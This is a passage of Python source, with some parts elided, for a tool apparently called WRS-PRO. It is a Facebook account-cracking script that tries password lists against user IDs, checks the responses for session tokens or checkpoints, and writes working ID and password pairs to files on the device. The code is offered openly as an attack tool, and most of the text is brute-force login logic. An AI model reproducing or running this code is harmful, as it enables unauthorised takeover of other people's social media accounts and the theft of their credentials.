...
----------------------------------------------
 Author    : SHAZAD ALI
 Github    : SHAZAD 420
 Facebook  : MR.SHAZAD.ALI
 Tool Name : WRS-PRO
 Type type : FREE
 Version   : 1.9.9
----------------------------------------------
 SHAZAD Pro version 1.9.9
 For Haters: BAAP HUN TERA FEEL KR 🤞
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [SHAZAD-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [SHAZAD-Ok] %s | %s'%(ids,pas))
                                open('/sdcard/SHAZAD-Ok.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [SHAZAD-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SHAZAD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [SHAZAD-Ok] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SHAZAD-Ok.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/SHAZAD-Ok.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [SHAZAD-Ok] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/SHAZAD-Ok.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [SHAZAD-Ok] '+uid+' | '+pas+'\033[1;97m')
